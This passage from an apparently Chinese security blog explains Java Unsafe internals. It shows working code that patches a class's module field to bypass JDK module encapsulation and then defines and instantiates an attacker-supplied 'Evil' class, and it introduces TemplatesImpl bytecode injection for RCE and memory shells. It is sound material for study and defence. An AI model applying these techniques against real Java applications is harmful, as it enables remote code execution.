+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>declaringClass</span><span class=p>.</span><span class=na>isHidden</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>UnsupportedOperationException</span><span class=p>(</span><span class=s>&#34;can&#39;t get base address on a hidden class: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>f</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>declaringClass</span><span class=p>.</span><span class=na>isRecord</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>UnsupportedOperationException</span><span class=p>(</span><span class=s>&#34;can&#39;t get base address on a record class: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>f</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>theInternalUnsafe</span><span class=p>.</span><span class=na>staticFieldBase</span><span class=p>(</span><span class=n>f</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>获取静态字段所属的 基对象 (Base Object)，读写静态字段需要配合使用：<code>unsafe.getObject(unsafe.staticFieldBase(f), unsafe.staticFieldOffset(f))</code>。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=nd>@ForceInline</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>allocateInstance</span><span class=p>(</span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>cls</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>throws</span><span class=w> </span><span class=n>InstantiationException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>theInternalUnsafe</span><span class=p>.</span><span class=na>allocateInstance</span><span class=p>(</span><span class=n>cls</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>分配内存并返回一个类的实例，但不执行任何构造函数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=nd>@Deprecated</span><span class=p>(</span><span class=n>since</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;15&#34;</span><span class=p>,</span><span class=w> </span><span class=n>forRemoval</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>true</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nd>@ForceInline</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>ensureClassInitialized</span><span class=p>(</span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>c</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>theInternalUnsafe</span><span class=p>.</span><span class=na>ensureClassInitialized</span><span class=p>(</span><span class=n>c</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>强制初始化一个类，执行<code>static {}</code> 静态代码块，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=nd>@ForceInline</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>getAndSetObject</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>o</span><span class=p>,</span><span class=w> </span><span class=kt>long</span><span class=w> </span><span class=n>offset</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>newValue</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>theInternalUnsafe</span><span class=p>.</span><span class=na>getAndSetReference</span><span class=p>(</span><span class=n>o</span><span class=p>,</span><span class=w> </span><span class=n>offset</span><span class=p>,</span><span class=w> </span><span class=n>newValue</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>根据内存偏移量以及具体值，来给指定对象的内存空间进行变量设置。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=nd>@ForceInline</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>putObject</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>o</span><span class=p>,</span><span class=w> </span><span class=kt>long</span><span class=w> </span><span class=n>offset</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>x</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>theInternalUnsafe</span><span class=p>.</span><span class=na>putReference</span><span class=p>(</span><span class=n>o</span><span class=p>,</span><span class=w> </span><span class=n>offset</span><span class=p>,</span><span class=w> </span><span class=n>x</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>等同于 <code>Field.set(obj, newValue)</code>。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=nd>@CallerSensitive</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>Unsafe</span><span class=w> </span><span class=nf>getUnsafe</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>caller</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Reflection</span><span class=p>.</span><span class=na>getCallerClass</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>VM</span><span class=p>.</span><span class=na>isSystemDomainLoader</span><span class=p>(</span><span class=n>caller</span><span class=p>.</span><span class=na>getClassLoader</span><span class=p>()))</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>SecurityException</span><span class=p>(</span><span class=s>&#34;Unsafe&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>theUnsafe</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>在普通应用代码里直接调用<code>Unsafe.getUnsafe()</code>会抛出 SecurityException 的原因，它检查了调用者的类加载器是否是系统根加载器（BootLoader），还是需要去反射获取。而在上面的<code>putObject</code>以及<code>getAndSetObject</code>我们选择使用 putObject，因为后者多了一个“读取旧值”和“保证原子性”的开销。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>org.example</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javassist.ClassPool</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javassist.CtClass</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Field</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Method</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>sun.misc.Unsafe</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import static</span><span class=w> </span><span class=nn>java.lang.Class.forName</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>test</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ClassPool</span><span class=w> </span><span class=n>pool</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ClassPool</span><span class=p>.</span><span class=na>getDefault</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>CtClass</span><span class=w> </span><span class=n>evilClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>pool</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=s>&#34;Evil&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>evilClass</span><span class=p>.</span><span class=na>setName</span><span class=p>(</span><span class=s>&#34;Evil&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>System</span><span class=p>.</span><span class=na>nanoTime</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>bytecodes</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>evilClass</span><span class=p>.</span><span class=na>toBytecode</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>//        Class UnsafeClass = Class.forName(&#34;sun.misc.unsafe&#34;);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>f</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Unsafe</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;theUnsafe&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>f</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Unsafe</span><span class=w> </span><span class=n>unsafe</span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Unsafe</span><span class=p>)</span><span class=w> </span><span class=n>f</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=kc>null</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Module</span><span class=w> </span><span class=n>ObjectModule</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Object</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getModule</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=w> </span><span class=n>currentClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>test</span><span class=p>.</span><span class=na>class</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>long</span><span class=w> </span><span class=n>addr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>unsafe</span><span class=p>.</span><span class=na>objectFieldOffset</span><span class=p>(</span><span class=n>Class</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;module&#34;</span><span class=p>));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>unsafe</span><span class=p>.</span><span class=na>putObject</span><span class=p>(</span><span class=n>currentClass</span><span class=p>,</span><span class=w> </span><span class=n>addr</span><span class=p>,</span><span class=w> </span><span class=n>ObjectModule</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Method</span><span class=w> </span><span class=n>defineClass</span><span class=o>=</span><span class=w> </span><span class=n>ClassLoader</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getDeclaredMethod</span><span class=p>(</span><span class=s>&#34;defineClass&#34;</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>defineClass</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>((</span><span class=n>Class</span><span class=p>)</span><span class=n>defineClass</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>ClassLoader</span><span class=p>.</span><span class=na>getSystemClassLoader</span><span class=p>(),</span><span class=w> </span><span class=n>evilClass</span><span class=p>.</span><span class=na>getName</span><span class=p>(),</span><span class=w> </span><span class=n>bytecodes</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>bytecodes</span><span class=p>.</span><span class=na>length</span><span class=p>)).</span><span class=na>newInstance</span><span class=p>();;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p><img src=/p/high-jdk-reflection-templatesimpl/2.png width=2448 height=1394 loading=lazy alt=img></p><p>写成工具方法</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>org.example</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javassist.ClassPool</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javassist.CtClass</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Field</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Method</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>sun.misc.Unsafe</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>test</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>patchModule</span><span class=p>(</span><span class=n>test</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ClassPool</span><span class=w> </span><span class=n>pool</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ClassPool</span><span class=p>.</span><span class=na>getDefault</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>CtClass</span><span class=w> </span><span class=n>evilClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>pool</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=s>&#34;Evil&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>evilClass</span><span class=p>.</span><span class=na>setName</span><span class=p>(</span><span class=s>&#34;Evil&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>System</span><span class=p>.</span><span class=na>nanoTime</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>bytecodes</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>evilClass</span><span class=p>.</span><span class=na>toBytecode</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Method</span><span class=w> </span><span class=n>defineClass</span><span class=o>=</span><span class=w> </span><span class=n>ClassLoader</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getDeclaredMethod</span><span class=p>(</span><span class=s>&#34;defineClass&#34;</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>defineClass</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>((</span><span class=n>Class</span><span class=p>)</span><span class=n>defineClass</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>ClassLoader</span><span class=p>.</span><span class=na>getSystemClassLoader</span><span class=p>(),</span><span class=w> </span><span class=n>evilClass</span><span class=p>.</span><span class=na>getName</span><span class=p>(),</span><span class=w> </span><span class=n>bytecodes</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>bytecodes</span><span class=p>.</span><span class=na>length</span><span class=p>)).</span><span class=na>newInstance</span><span class=p>();;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>patchModule</span><span class=p>(</span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>clazz</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Unsafe</span><span class=w> </span><span class=n>unsafe</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getUnsafe</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Module</span><span class=w> </span><span class=n>javaBaseModule</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Object</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getModule</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>long</span><span class=w> </span><span class=n>offset</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>unsafe</span><span class=p>.</span><span class=na>objectFieldOffset</span><span class=p>(</span><span class=n>Class</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;module&#34;</span><span class=p>));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>unsafe</span><span class=p>.</span><span class=na>putObject</span><span class=p>(</span><span class=n>clazz</span><span class=p>,</span><span class=w> </span><span class=n>offset</span><span class=p>,</span><span class=w> </span><span class=n>javaBaseModule</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>e</span><span class=p>.</span><span class=na>printStackTrace</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>Unsafe</span><span class=w> </span><span class=nf>getUnsafe</span><span class=p>()</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>f</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Unsafe</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;theUnsafe&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>f</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=p>(</span><span class=n>Unsafe</span><span class=p>)</span><span class=w> </span><span class=n>f</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=kc>null</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><h2 id=templatesimpl>TemplatesImpl</h2><p>最初学习 P🐂 在知识星球中放的文档，我其实并不是很明白，我只知道需要赋值三个属性，但是到了需要打内存🐎的时候，之前我也看到过 asalin的 poc 里面并没有赋值 _tfactory 也能成功，现在算是稍微有些了解了。</p><p><code>TemplatesImpl</code> 是 Xalan 库中可序列化的类，通过反射修改其 <code>_bytecodes</code> 字段为恶意字节码，并触发 <code>getTransletInstance()</code> 方法加载实例化该类，即可实现 RCE。</p><p><img src=/p/high-jdk-reflection-templatesimpl/3.png width=1374 height=1216 loading=lazy alt=img></p><p>可以看到两个条件，<code>_name!=null</code>和<code>defineTransletClasses()</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
